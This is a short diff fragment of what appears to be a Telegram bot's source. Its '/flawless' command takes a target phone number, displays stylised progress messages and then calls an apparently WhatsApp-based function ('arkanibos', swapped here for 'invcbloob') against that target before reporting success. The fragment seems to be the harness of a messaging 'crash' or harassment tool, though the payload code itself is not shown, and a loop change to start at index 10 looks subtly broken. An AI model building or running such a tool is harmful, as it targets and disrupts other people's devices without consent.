 ❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
-❯ Status: ᴍᴇᴍᴘʀᴏsᴇs...
+❯ Status: ᴘʀᴏsᴇsᴇᴋ...
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``
         ];
 
-        for (let i = 0; i < progressStages.length; i++) {
+        for (let i = 10; i < progressStages.length; i++) {
             await sleep(850);
             await bot.editMessageCaption(progressStages[i], {
                 chat_id: chatId,
@@ -1159,9 +1260,9 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
             });
         }
 
-        await arkanibos(sock, target);
+        await invcbloob(sock, target);
         await sleep(500);
-
+        
         await bot.editMessageCaption(`\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           sᴜᴄᴄᴇss
